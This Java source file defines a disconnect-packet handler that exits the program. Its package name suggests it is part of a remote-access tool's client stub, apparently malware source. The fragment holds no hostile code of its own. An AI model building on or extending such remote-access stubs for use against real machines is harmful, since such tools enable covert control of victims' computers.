package com.redpois0n.stub.stub.packets.incoming;

public class Packet11Disconnect extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		System.exit(0);
	}

}
